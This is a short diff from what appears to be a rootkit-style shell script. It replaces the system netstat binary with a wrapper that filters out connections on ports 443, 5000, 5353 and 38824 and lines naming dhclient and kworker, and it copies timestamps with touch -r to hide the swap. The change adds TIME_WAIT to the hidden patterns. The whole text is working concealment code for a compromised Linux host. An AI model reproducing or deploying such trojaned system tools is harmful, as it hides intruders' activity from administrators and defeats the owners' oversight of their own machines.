@@ -9,6 +9,6 @@ touch -r iftop2 iftop
 mv /bin/netstat /bin/ntstat
 cd /bin/
 echo '#!/bin/bash
-/bin/ntstat $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker"' > netstat
+/bin/ntstat $1 $2 $3 $4 $5 $6 | grep -Ev "443|5000|5353|38824|dhclient|kworker|TIME_WAIT"' > netstat
 chmod 755 netstat
 touch -r /bin/ntstat /bin/netstat
